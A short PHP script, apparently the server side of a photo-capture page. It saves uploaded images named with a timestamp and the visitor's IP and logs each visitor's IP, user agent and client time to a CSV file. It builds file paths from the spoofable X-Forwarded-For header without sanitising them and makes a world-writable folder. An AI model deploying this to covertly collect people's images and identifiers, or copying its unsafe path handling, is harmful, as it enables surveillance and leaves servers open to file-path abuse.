<?php
date_default_timezone_set('Africa/Nairobi');
$SAVE_DIR = __DIR__ . '/photos';
if (!is_dir($SAVE_DIR)) mkdir($SAVE_DIR, 0777, true);

function client_ip(){
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['image'])) {
    http_response_code(400); exit;
}
$file = $_FILES['image'];
$mime = mime_content_type($file['tmp_name']);
$ext = ($mime==='image/png')?'png':'jpg';
$timestamp = date('Y-m-d_H-i-s');
$ip = client_ip();
$basename = "capture_{$timestamp}_{$ip}.{$ext}";
$target = $SAVE_DIR.'/'.$basename;
move_uploaded_file($file['tmp_name'], $target);

$logfile = $SAVE_DIR.'/ip_log.csv';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$client_ts = $_POST['client_time'] ?? '';
$f = fopen($logfile,'a'); fputcsv($f, [$timestamp,$ip,$ua,$basename,$client_ts]); fclose($f);
echo json_encode(['ok'=>true,'file'=>$basename]);
?>
